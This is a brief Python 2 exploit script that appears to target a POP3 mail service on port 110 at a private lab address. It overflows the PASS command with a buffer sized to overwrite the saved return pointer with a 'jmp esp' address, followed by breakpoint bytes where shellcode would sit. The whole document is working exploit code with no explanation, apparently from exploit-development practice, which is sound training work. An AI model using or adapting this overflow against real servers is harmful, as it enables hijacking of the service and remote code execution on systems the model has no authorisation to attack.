#!/usr/bin/env python2
import socket
import struct

RHOST = "10.0.2.15"
RPORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf_totlen = 2700
offset_srp = 2606

ptr_jmp_esp = 0x5f4a358f

buf = ""
buf += "A" * (offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "\xCC\xCC\xCC\xCC"
buf += "D" * (buf_totlen - len(buf))
buf += "\n"

s.connect((RHOST, RPORT))
data = s.recv(1024)
print data
s.send('USER username' + '\r\n')
data = s.recv(1024)
print data
s.send('PASS ' + buf + '\r\n')
